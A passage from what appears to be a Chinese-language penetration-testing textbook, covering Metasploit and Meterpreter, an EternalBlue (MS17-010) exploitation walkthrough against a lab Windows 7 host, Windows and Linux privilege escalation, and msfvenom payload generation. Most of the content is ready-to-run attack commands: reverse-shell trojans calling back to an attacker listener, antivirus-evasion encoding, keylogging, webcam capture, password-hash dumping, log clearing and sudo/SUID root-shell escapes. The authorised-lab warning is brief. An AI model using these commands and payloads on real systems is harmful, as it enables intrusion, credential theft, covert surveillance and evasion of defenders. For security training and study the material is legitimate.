## 4.1 Metasploit——渗透测试的"瑞士军刀"

### 4.1.1 Metasploit是啥？

用大白话讲：

```
Metasploit = 漏洞利用框架

它里面集成了N多个漏洞的利用代码（叫"模块"），
你不用自己写exp（漏洞利用代码），
找到漏洞了，直接搜一下有没有对应的模块，
设好参数，run一下就完事了。

就像你有个工具箱，
里面有各种型号的螺丝刀，
碰到什么螺丝就用什么螺丝刀，
不用自己现做工具。
```

Metasploit的作者是HD Moore，
现在由Rapid7公司在维护。

### 4.1.2 Metasploit的组成

```
Metasploit主要有这几部分：

┌──────────────────────────────────┐
│  模块（Modules）                  │
│  就是各种漏洞利用代码              │
│  分好几种类型：                    │
│  • exploits → 漏洞利用（主动打）  │
│  • payloads → 攻击载荷（打过去后执行的东西）│
│  • auxiliaries → 辅助模块（扫描、爆破等） │
│  • encoders → 编码模块（免杀用）  │
│  • nops → NOP空指令               │
│  • post → 后渗透模块              │
└──────────────────────────────────┘

┌──────────────────────────────────┐
│  接口（Interfaces）               │
│  • msfconsole → 命令行（最常用）  │
│  • msfcli → 命令行参数模式        │
│  • Armitage → 图形界面            │
│  • msfweb → 网页界面              │
└──────────────────────────────────┘
```

### 4.1.3 启动Metasploit

Kali里已经预装了，直接启动就行。

```bash
# 第一步：先启动PostgreSQL数据库（不然很慢）
kali@kali:~$ sudo service postgresql start

# 第二步：初始化数据库（第一次用要做）
kali@kali:~$ sudo msfdb init

# 第三步：启动msfconsole
kali@kali:~$ msfconsole

# 等一会儿，会出现一个很帅的启动画面，
# 然后提示符变成：
msf6 >
```

> 💡 **小提示**：第一次启动可能比较慢，耐心等。
> 启动数据库后速度会快很多。

### 4.1.4 msfconsole基本操作

先来几个基础命令热热身：

```bash
# 1. 看帮助
msf6 > help
# 或者 ?

# 2. 搜索模块（最常用！）
msf6 > search 关键词
# 比如：search ms17-010
# 比如：search eternalblue
# 比如：search vsftpd

# 3. 使用某个模块
msf6 > use 模块名
# 比如：use exploit/windows/smb/ms17_010_eternalblue
# 用了之后提示符会变：
# msf6 exploit(windows/smb/ms17_010_eternalblue) >

# 4. 看这个模块的信息
msf6 exploit(...) > info
# 会显示：模块名、作者、目标、描述...

# 5. 看需要设置哪些参数
msf6 exploit(...) > show options
# 必设的参数会在 Required 那一列标 yes

# 6. 设置参数
msf6 exploit(...) > set 参数名 值
# 比如：set RHOSTS 192.168.1.100
# 比如：set LHOST 192.168.1.200
# 比如：set RPORT 445

# 7. 看payload有哪些
msf6 exploit(...) > show payloads

# 8. 设置payload
msf6 exploit(...) > set payload payload名
# 比如：set payload windows/x64/meterpreter/reverse_tcp

# 9. 检查参数设全了没
msf6 exploit(...) > check
# 有的模块支持check，可以先检测目标有没有漏洞
# 不支持的话会说 "check is not supported"

# 10. 开打！
msf6 exploit(...) > exploit
# 或者 run
# 成功的话会拿到Meterpreter会话

# 11. 后台运行
msf6 exploit(...) > exploit -j
# -j 就是job模式，后台运行

# 12. 看有哪些会话
msf6 > sessions -l
# 或者 sessions

# 13. 进入某个会话
msf6 > sessions -i 1
# 1是会话ID

# 14. 退回到msf
meterpreter > background
# 或者 Ctrl+Z
```

### 4.1.5 常用模块类型速查

```
exploits（漏洞利用）路径格式：
  exploit/系统/服务/漏洞名

例子：
  exploit/windows/smb/ms17_010_eternalblue
  exploit/unix/ftp/vsftpd_234_backdoor
  exploit/multi/http/phpunit_eval_stdin

auxiliary（辅助模块）：
  auxiliary/scanner/portscan/tcp
  auxiliary/scanner/smb/smb_ms17_010
  auxiliary/scanner/ssh/ssh_login
  auxiliary/scanner/mysql/mysql_login

payload（攻击载荷）：
  windows/x64/meterpreter/reverse_tcp   ← Windows 64位 反向TCP
  windows/meterpreter/reverse_tcp       ← Windows 32位
  linux/x86/meterpreter/reverse_tcp     ← Linux 32位
  linux/x64/meterpreter/reverse_tcp     ← Linux 64位
  php/meterpreter/reverse_tcp           ← PHP
  java/jsp_shell_reverse_tcp            ← JSP
```

### 4.1.6 什么是Meterpreter？

Meterpreter是Metasploit里最常用的payload，
功能超级强大，是个内存级的Shell，
不会在硬盘上留下文件，比较隐蔽。

```
Meterpreter能干嘛？
  ✓ 执行命令
  ✓ 上传下载文件
  ✓ 截图、开摄像头
  ✓ 键盘记录
  ✓ 提权
  ✓ 抓取密码哈希
  ✓ 内网代理
  ✓ 横向移动
  ✓ ......
  总之就是你想要的功能基本都有
```

#### Meterpreter常用命令

```bash
# 进入Meterpreter后的提示符：
meterpreter >

# 帮助
meterpreter > help

# 基础命令
meterpreter > pwd            # 看当前目录
meterpreter > ls             # 列文件
meterpreter > cd 目录        # 切换目录
meterpreter > upload 本地文件 目标路径  # 上传文件
meterpreter > download 目标文件 本地路径 # 下载文件
meterpreter > cat 文件名     # 看文件内容
meterpreter > rm 文件名      # 删除文件
meterpreter > mkdir 目录名   # 新建目录

# 系统命令
meterpreter > sysinfo        # 系统信息
meterpreter > ps             # 进程列表
meterpreter > kill 进程ID    # 杀进程
meterpreter > getuid         # 看当前用户
meterpreter > getpid         # 看当前进程ID
meterpreter > reboot         # 重启
meterpreter > shutdown       # 关机

# Shell相关
meterpreter > shell          # 进入系统命令行
# （进入shell后要退回来输入exit）
meterpreter > execute -f cmd.exe -i -H  # 执行命令

# 提权
meterpreter > getsystem      # 自动尝试提权到SYSTEM
meterpreter > getprivs       # 查看当前权限

# 密码哈希
meterpreter > hashdump       # 抓SAM哈希（需要SYSTEM权限）
meterpreter > run post/windows/gather/hashdump

# 网络
meterpreter > ipconfig       # 看网卡信息
meterpreter > route          # 看路由
meterpreter > arp            # 看ARP表
meterpreter > portfwd        # 端口转发

# 其他好玩儿的
meterpreter > screenshot     # 截图
meterpreter > webcam_list    # 看有哪些摄像头
meterpreter > webcam_snap    # 拍张照片
meterpreter > keyscan_start  # 开始键盘记录
meterpreter > keyscan_dump   # 查看记录到的按键
meterpreter > keyscan_stop   # 停止键盘记录
meterpreter > clearev        # 清除日志
```

> 🚨 **再次警告**：这些工具只能用在你自己的实验环境里，
> 或者有明确书面授权的环境里。
> 乱用是违法的！

## 4.2 经典漏洞实战：永恒之蓝（MS17-010）

说了这么多，我们来实际打一个——鼎鼎大名的**永恒之蓝**。

### 4.2.1 永恒之蓝是啥？

```
永恒之蓝（EternalBlue）= MS17-010 漏洞

这是2017年泄露出来的NSA（美国国家安全局）黑客工具，
利用Windows SMB服务的一个漏洞，
可以远程执行代码，威力巨大。

当年的WannaCry勒索病毒就是用这个漏洞传播的，
一夜之间席卷全球。
```

受影响的系统：
- Windows XP
- Windows 7
- Windows Server 2003
- Windows Server 2008
- （Windows 10 1703以前的版本）

### 4.2.2 准备靶机

我们需要一台有漏洞的靶机。
这里推荐用 **Windows 7 旗舰版**，不要打补丁。

```
实验环境：
  攻击机：Kali Linux  (192.168.1.100)
  靶机：  Windows 7   (192.168.1.200)
  两台机器要能互相ping通
```

### 4.2.3 第一步：探测漏洞

先扫一下目标有没有MS17-010漏洞：

```bash
# 启动msfconsole
kali@kali:~$ msfconsole

# 搜索ms17-010的扫描模块
msf6 > search ms17-010

# 你会看到好几个模块，我们用扫描的那个：
msf6 > use auxiliary/scanner/smb/smb_ms17_010

# 设置目标IP
msf6 auxiliary(...) > set RHOSTS 192.168.1.200

# 设置线程
msf6 auxiliary(...) > set THREADS 10

# 开始扫描
msf6 auxiliary(...) > run
```

如果有漏洞，你会看到：
```
[+] 192.168.1.200:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7600 x64 (64-bit)
```

好，确认有漏洞，开打！

### 4.2.4 第二步：利用漏洞

```bash
# 使用永恒之蓝利用模块
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 设置目标
msf6 exploit(...) > set RHOSTS 192.168.1.200

# 设置payload（64位系统用x64的）
msf6 exploit(...) > set payload windows/x64/meterpreter/reverse_tcp

# 设置监听地址（就是我们Kali的IP）
msf6 exploit(...) > set LHOST 192.168.1.100

# 检查一下参数
msf6 exploit(...) > show options

# 确认没问题，开打！
msf6 exploit(...) > exploit
```

然后就是紧张刺激的等待...
如果成功了，你会看到：

```
[*] Started reverse TCP handler on 192.168.1.100:4444 
[*] 192.168.1.200:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.200:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7600 x64 (64-bit)
[*] 192.168.1.200:445 - The target is vulnerable.

meterpreter >
```

🎉 **成功了！我们拿到Meterpreter了！**

## 4.3 提权概述

刚才永恒之蓝打下来直接就是SYSTEM权限，
很爽对吧？但不是每次都这么幸运。

很多时候你拿到的只是普通用户权限，
比如WebShell一般是www-data、apache、nobody这种低权限用户。

这时候你就需要**提权**——把权限从普通用户提升到管理员。

### 4.3.1 提权分几种？

```
提权两大方向：

┌──────────────────────────────────┐
│  垂直提权（从低到高）              │
│  普通用户 → 管理员/root           │
│  这个是我们最常说的"提权"          │
└──────────────────────────────────┘

┌──────────────────────────────────┐
│  水平提权（同级之间）              │
│  A普通用户 → B普通用户            │
│  也叫横向移动（内网里常用）        │
└──────────────────────────────────┘
```

### 4.3.2 提权思路

```
提权的基本思路：
  1. 先收集信息（系统版本、补丁情况、运行的服务...）
  2. 找可能的提权点
  3. 找对应的exp
  4. 上传到目标机器执行
  5. 成功拿到高权限
```

## 4.4 Windows提权

Windows提权是渗透测试里的重头戏，
方法非常多，我们一个个讲。

### 4.4.1 提权前的信息收集

先搞清楚目标是什么系统、打了哪些补丁。

```bash
# 在拿到的Shell里执行：

# 1. 系统版本
systeminfo
# 或者
ver

# 2. 看打了哪些补丁
systeminfo | findstr /B /C:"KB"
# 或者
wmic qfe get Caption,Description,HotFixID,InstalledOn

# 3. 当前用户和权限
whoami
whoami /priv
# 看看有哪些特殊权限，比如SeDebugPrivilege这种

# 4. 看有哪些用户
net user
net localgroup administrators

# 5. 看进程列表
tasklist
# 或者
wmic process get name,processid,path

# 6. 看服务
net start
# 或者
wmic service get name,displayname,pathname,startmode

# 7. 看计划任务
schtasks /query /fo LIST /v
# 或者
at

# 8. 看安装的软件
wmic product get name,version

# 9. 看网络情况
ipconfig /all
netstat -ano
```

收集完信息，就可以判断用哪种方法提权了。

### 4.4.2 方法1：内核漏洞提权

最简单粗暴的方法——利用系统内核漏洞直接提权。

```
原理：
  系统内核有漏洞，
  利用这个漏洞执行任意代码，
  直接拿到SYSTEM权限。

常见的内核漏洞：
  • MS17-010 永恒之蓝（这个其实是远程的）
  • MS16-032
  • MS15-051
  • MS14-058
  • MS13-053
  • MS11-046
  • MS08-067
  • ......
```

#### 提权步骤

```
1. 用systeminfo看系统补丁
2. 对比一下，哪些提权漏洞的补丁没打
3. 找对应的exp（可执行文件）
4. 上传到目标机器
5. 运行exp
6. 拿到SYSTEM权限
```

#### 怎么找对应exp？

两个好用的网站/脚本：

```
1. Windows Exploit Suggester
   GitHub上搜 Windows-Exploit-Suggester
   把systeminfo的输出存成文件，
   它自动帮你分析有哪些可能的提权漏洞

2. 在线查询
   https://bugs.hacking8.com/tiquan/
   输入系统版本和补丁号，自动列出可能的漏洞
```

> ⚠️ **注意事项**：
> 1. 内核漏洞exp可能会导致蓝屏，要做好心理准备
> 2. 32位和64位的exp不通用，别搞错了
> 3. 不同补丁版本的exp也可能不一样

### 4.4.3 方法2：服务权限配置错误

这个方法比较稳，不容易蓝屏。

```
原理：
  Windows服务一般都是以SYSTEM权限运行的，
  如果服务对应的可执行文件路径我们有权修改，
  那我们就可以把原来的exe替换成我们的木马，
  服务重启的时候，
  我们的木马就会以SYSTEM权限运行。

又或者，
  服务的路径里有空格、没加引号，
  Windows在找exe的时候会有歧义，
  我们可以利用这个...
```

#### 情况A：服务路径有空格且未加引号

举个例子：
```
服务路径：C:\Program Files\MyService\service.exe

因为有空格又没加引号，
Windows会按这个顺序找：
  C:\Program.exe
  C:\Program Files\My.exe
  C:\Program Files\MyService\service.exe

如果我们能在C:\根目录放一个叫Program.exe的文件，
那服务重启时就会执行我们的Program.exe，
而且是SYSTEM权限！
```

怎么找这种服务？

```bash
# 找路径没加引号、且有空格的服务
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# 解释一下：
# findstr /i "Auto" → 只看自动启动的服务
# findstr /i /v "C:\Windows\\" → 排除系统自带的
# findstr /i /v """ → 找路径里没有双引号的（也就是没加引号的）
```

找到之后，把你的木马放到那个位置就行了。

#### 情况B：服务文件权限配置错误

如果某个服务的exe文件，我们普通用户就能修改，
那直接替换成我们的木马，服务重启就提权了。

```bash
# 用accesschk工具检查权限
# （accesschk是微软官方工具，Sysinternals套件里的）

accesschk.exe -uwcqv "Authenticated Users" *
# 看看Authenticated Users组对哪些服务有写权限

accesschk.exe -ucqv 服务名
# 看某个服务的详细权限
```

### 4.4.4 方法3：计划任务提权

和服务类似，如果有个计划任务：
- 以高权限运行
- 执行的脚本/程序我们能改

那我们改一下那个脚本，等计划任务运行，就提权了。

```bash
# 看有哪些计划任务
schtasks /query /fo LIST /v

# 重点看：
#   任务名
#   运行用户（是不是SYSTEM/管理员）
#   执行的程序路径
#   运行时间/触发条件
```

### 4.4.5 方法4：AlwaysInstallElevated提权

这是Windows Installer的一个配置，
如果开了这个，普通用户也能以SYSTEM权限安装MSI包。

```
检查有没有开启：
# 两个注册表项都得是1才可以
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

如果两个都是0x1（也就是1），
那就可以利用！
```

利用方法：

```bash
# 1. 用msfvenom生成一个MSI木马
kali@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f msi -o evil.msi

# 2. 把evil.msi上传到目标机器

# 3. 安装这个MSI
msiexec /quiet /qn /i evil.msi

# 4. 监听那边就能收到SYSTEM权限的Shell了
```

### 4.4.6 方法5：令牌窃取（Token Impersonation）

这个也很经典，用烂土豆（Rotten Potato）之类的工具。

```
原理：
  有些服务账户有"模拟"权限，
  可以伪造其他用户的令牌，
  从而以那个用户的身份执行代码。

典型的就是烂土豆提权：
  普通用户 → 通过烂土豆 → 拿到SYSTEM令牌 → 模拟SYSTEM
```

Meterpreter里直接就能用：

```bash
# 看当前有哪些令牌
meterpreter > list_tokens -u

# 偷一个令牌
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"

# 然后你就是SYSTEM了！
```

或者用烂土豆：

```bash
# 上传potato.exe到目标
# 执行
potato.exe -l 1111 -p cmd.exe -t * -c {CLSID}

# 网上有现成的烂土豆工具，直接用就行
```

### 4.4.7 方法6：注册表项权限错误

如果某些注册表项（比如服务的配置项）普通用户能改，
那也可以提权。

比如服务的ImagePath键值，我们能改的话，
直接改成我们的木马路径，服务重启就提权了。

```bash
# 用accesschk查注册表权限
accesschk.exe -kvu "Everyone" hklm\system\currentcontrolset\services
```

### 4.4.8 Windows提权辅助工具

手动找提权点太累？用工具啊！

```
推荐几个好用的提权辅助工具：

1. PowerUp
   PowerShell脚本，专门用来检查Windows提权点
   地址：GitHub上的 PowerShellMafia/PowerSploit
   里面的 Privesc 目录下有 PowerUp.ps1

   用法：
   powershell -ep bypass -Command "Import-Module .\PowerUp.ps1; Invoke-AllChecks"

2. WinPEAS
   也是个很火的提权信息收集脚本
   有exe版也有bat版
   自动扫描系统，列出可能的提权点
   地址：GitHub上的 carlospolop/PEASS-ng

3. Windows Exploit Suggester - Next Generation (WES-NG)
   根据系统补丁号，列出可能的内核漏洞
   地址：GitHub上的 bitsadmin/wesng
```

## 4.5 Linux提权

Linux提权的思路和Windows差不多，
也是先收集信息，再找漏洞，再打exp。

### 4.5.1 提权前的信息收集

```bash
# 1. 系统信息
uname -a          # 内核版本
cat /etc/issue    # 发行版
cat /etc/*release # 详细发行版信息

# 2. 用户信息
whoami            # 当前用户
id                # 用户ID和组
cat /etc/passwd   # 所有用户
cat /etc/shadow   # 影子文件（要root才能看）
sudo -l           # 看当前用户能sudo什么（重点！）

# 3. 看有哪些SUID文件
find / -perm -4000 -type f 2>/dev/null
# SUID文件会以文件所有者的身份运行

# 4. 看有哪些SGID文件
find / -perm -2000 -type f 2>/dev/null

# 5. 看可写的目录
find / -writable -type d 2>/dev/null

# 6. 看所有可写的文件
find / -writable -type f 2>/dev/null

# 7. 看运行的进程
ps aux
ps -ef

# 8. 看计划任务
crontab -l
ls -la /etc/cron*
cat /etc/crontab

# 9. 看服务
systemctl list-units --type=service
service --status-all

# 10. 看内核漏洞
# 用uname -a得到内核版本，然后去搜对应版本的提权漏洞
```

### 4.5.2 方法1：sudo提权（最常见！）

这是Linux提权里最常碰到的情况。

```
原理：
  管理员为了方便，
  给了普通用户sudo执行某些命令的权限，
  但这些命令如果能"逃逸"出去，
  就能拿到root权限。
```

#### 第一步：看看能sudo啥

```bash
sudo -l
# 看看输出里的User xxx may run the following commands...
# 列出了你能以root身份执行的命令
```

#### 第二步：想办法"逃逸"

很多命令都能"逃逸"成Shell，
比如：

```bash
# 1. vim
sudo vim
# 进去后输入 :!bash 或者 :shell
# 就得到root的Shell了

# 2. less/more
sudo less /etc/passwd
# 进去后输入 !bash

# 3. nmap
sudo nmap --interactive
nmap> !sh
# 就有Shell了
# 新版本的nmap去掉了interactive模式，
# 但还可以用脚本的方式：
echo "os.execute('/bin/bash')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse

# 4. find
sudo find . -exec /bin/sh \; -quit
# find的-exec参数会执行命令
# find本身是root跑的，所以exec出来的sh也是root

# 5. python/perl/ruby等
sudo python -c 'import os; os.system("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo ruby -e 'exec "/bin/bash"'

# 6. awk
sudo awk 'BEGIN {system("/bin/bash")}'

# 7. bash本身
sudo bash
# （这个是废话，但有的时候真的可以...）

# 8. zip
sudo zip /tmp/test.zip /etc/passwd -T --unzip-command="sh -c /bin/bash"

# 9. tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

> 💡 **更多逃逸命令**：
> 去搜 "GTFOBins"，
> 这是个专门收集各种命令提权姿势的网站，
> 超级全，碰到哪个命令就去搜哪个。

### 4.5.3 方法2：SUID提权

SUID是Linux的一种特殊权限，
设置了SUID的文件，运行的时候会以文件所有者的身份运行。

如果某个设置了SUID（所有者是root）的程序有问题，
我们就能利用它拿到root权限。

```bash
# 找所有SUID文件
find / -perm -u=s -type f 2>/dev/null
```

常见的SUID提权：

```bash
# 1. nmap（前面说过了）

# 2. vim
# 如果vim是SUID的
./vim -c ':!/bin/sh'

# 3. find
./find . -exec /bin/sh \; -quit

# 4. bash
./bash -p
# -p 参数让bash以真实UID运行（也就是SUID的所有者）

# 5. cp
# 复制/etc/passwd，加一个root权限的用户
# 或者复制shadow文件回来破解

# 6. 各种自定义的SUID程序
# 比如管理员写的什么备份脚本、管理脚本
# 如果有漏洞（比如调用系统命令没写绝对路径），
# 就可以利用
```

### 4.5.4 方法3：内核漏洞提权

和Windows一样，Linux内核也有漏洞。

```
常见的Linux内核提权漏洞：
  • Dirty Cow（脏牛，CVE-2016-5195）- 经典中的经典
  • Dirty Pipe（脏管道，CVE-2022-0847）
  • SUDO 漏洞（CVE-2021-3156）
  • Polkit 漏洞（CVE-2021-3560）
  • ......
```

利用步骤：

```
1. 用 uname -a 看内核版本
2. 去搜对应版本的提权漏洞
3. 下载exp源码
4. 上传到目标机器编译运行
5. 拿到root Shell
```

> 📝 **注意**：
> 编译的时候注意目标系统的架构（32位还是64位），
> 还有glibc版本，不然可能编译出来跑不了。

### 4.5.5 方法4：计划任务提权

如果有个计划任务（cron job）：
- 以root运行
- 执行的脚本我们能改
- 或者脚本里调用的命令没写绝对路径

那我们就能利用。

```bash
# 看计划任务
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
crontab -l
```

两种利用方式：

**方式1：脚本可写**
```
如果脚本我们能改，
直接在脚本里加一行反弹Shell的命令，
等计划任务执行，就拿到root了。
```

**方式2：路径劫持**
```
如果脚本里的命令没写绝对路径，比如：
  0 * * * * root backup.sh
  
而backup.sh里写的是：
  #!/bin/bash
  tar -czf /backup.tar.gz /home

那我们可以在PATH前面的目录放一个叫tar的木马，
这样执行的时候就会先找到我们的tar，
以root权限运行。
```

### 4.5.6 方法5：密码复用/弱密码

有的时候管理员图省事，
多个账号用同一个密码。

```
比如：
  你拿到了www-data用户的密码，
  说不定root用户也用的同一个密码？
  或者其他普通用户的密码能sudo？
```

还有的系统里：
- 配置文件里明文写了数据库密码
- 数据库密码和系统管理员密码一样
- 备份文件里有密码
- ......

### 4.5.7 Linux提权辅助工具

```
好用的Linux提权检查脚本：

1. LinPEAS
   超详细的Linux提权信息收集脚本
   自动扫描各种提权点
   地址：GitHub上的 carlospolop/PEASS-ng
   （就是和WinPEAS同一个系列的）

2. LinEnum
   也是个经典的提权信息收集脚本
   地址：GitHub上的 rebootuser/LinEnum

3. Linux Exploit Suggester
   根据内核版本推荐可能的内核漏洞
   地址：GitHub上的 mzet-/linux-exploit-suggester
```

## 4.6 msfvenom——生成木马Payload

实战中经常需要自己生成木马，
msfvenom就是干这个的。

### 4.6.1 msfvenom是啥？

```
msfvenom = msfpayload + msfencode
（这俩命令合并成msfvenom了）

作用：
  生成各种格式的Payload，
  还能编码免杀。
```

### 4.6.2 基本用法

```bash
# 基本格式
msfvenom -p payload类型 LHOST=你的IP LPORT=你的端口 -f 格式 -o 输出文件名

# 例子：生成Windows 64位的反向TCP木马exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
```

### 4.6.3 常用Payload和格式

```
常用Payload：
  windows/x64/meterpreter/reverse_tcp    Win64反向TCP
  windows/meterpreter/reverse_tcp        Win32反向TCP
  windows/x64/meterpreter/bind_tcp       Win64绑定TCP
  linux/x64/meterpreter/reverse_tcp      Linux64反向TCP
  linux/x86/meterpreter/reverse_tcp      Linux32反向TCP
  php/meterpreter/reverse_tcp            PHP一句话
  java/jsp_shell_reverse_tcp             JSP
  python/meterpreter/reverse_tcp         Python
  cmd/unix/reverse_bash                  Bash反弹Shell

常用格式（-f参数）：
  exe           → Windows可执行文件
  dll           → Windows DLL
  elf           → Linux可执行文件
  msi           → Windows安装包
  asp           → ASP脚本
  aspx          → ASPX脚本
  php           → PHP脚本
  jsp           → JSP脚本
  war           → Java WAR包
  python        → Python代码
  bash          → Bash命令
  c             → C语言源码
  raw           → 原始Shellcode
```

### 4.6.4 编码免杀

生成的木马很容易被杀毒软件查杀，
我们可以用msfvenom的编码功能试试免杀。

```bash
# 看有哪些编码器
msfvenom -l encoders

# 用x86/shikata_ga_nai编码（最经典的）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe

# -e 指定编码器
# -i 编码次数（次数越多越难查杀，但体积越大）
```

> 💡 **注意**：现在的杀毒软件都很厉害，
> 光靠msfvenom编码已经很难免杀了。
> 真正的免杀需要更高级的技术，
> 比如加壳、混淆、分离免杀等等。
> 这里先不多讲，有个概念就行。

### 4.6.5 监听回连

生成了木马，还得在我们这边监听，
等目标运行木马后，Shell就会回连过来。

```bash
# 方法1：用msfconsole的handler
msf6 > use exploit/multi/handler
msf6 exploit(handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(handler) > set LHOST 0.0.0.0
msf6 exploit(handler) > set LPORT 4444
msf6 exploit(handler) > exploit

# 然后等着目标运行木马，
# 上线了就会有提示

# 方法2：用nc（普通Shell可以用这个）
kali@kali:~$ nc -lvp 4444
# 等目标反弹Shell过来
```
